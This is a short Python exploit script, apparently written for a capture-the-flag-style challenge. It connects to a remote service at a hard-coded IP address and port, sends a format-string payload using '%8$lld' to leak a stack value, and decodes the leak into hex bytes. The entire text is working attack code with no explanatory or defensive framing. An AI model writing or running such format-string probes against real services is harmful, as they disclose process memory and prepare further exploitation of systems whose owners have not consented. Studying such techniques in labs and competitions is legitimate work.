#!/usr/bin/env python3
import socket, time, re
HOST="144.79.188.39"; PORT=43642
def newconn():
    s=socket.socket(); s.settimeout(1.0); s.connect((HOST,PORT)); s.recv(300); return s
def ask(s,fmt):
    if isinstance(fmt,str): fmt=fmt.encode()
    s.send(fmt+b"\n"); time.sleep(0.05)
    try: return s.recv(4096)
    except Exception: return b'<T>'
s=newconn()
# buffer[0:16]= format with %8$lld, buffer[16:22]="BCDEFG", buffer[22]="H"
payload = b"A"*10 + b"%8$lld" + b"BCDEFG" + b"H"
print("payload len", len(payload))
d=ask(s, payload)
print("=>", repr(d))
# arg8 as llu would be better but lld may be negative; decode
m=re.search(rb'([0-9-]+)\n', d)
if m:
    v=int(m.group(1)) & ((1<<64)-1)
    print("arg8 =", hex(v))
    print("bytes:", v.to_bytes(8,'little').hex())
s.close()
